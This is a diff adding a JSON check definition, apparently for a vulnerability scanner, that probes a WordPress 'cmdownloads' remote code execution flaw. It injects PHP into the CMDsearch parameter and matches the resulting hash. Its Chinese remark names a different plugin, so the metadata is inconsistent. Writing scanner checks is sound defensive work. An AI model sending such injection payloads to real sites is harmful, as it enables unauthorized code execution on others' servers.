@@ -1,0 +1,23 @@
+{
+    "target":"wordpress",
+    "meta":{
+        "name":    "Wordpress cmdownloads RCE",
+        "remarks": "WordPress wp-support-plus-responsive-ticket-system plugin downloadAttachment.php 存在代码执行漏洞",
+        "level":   0,
+        "type":    "RCE",
+        "author":   "wolf",
+        "references": {
+            "url":"",
+            "cve":"",
+            "kpid":"KP-0068"
+        }
+    },
+    "request":{
+        "path":     "/cmdownloads/?CMDsearch=\".md5(700).\"",
+        "postData": ""
+    },
+    "verify":{
+        "type":  "string",
+        "match": "e5841df2166dd424a57127423d276bbe"
+    }
+}
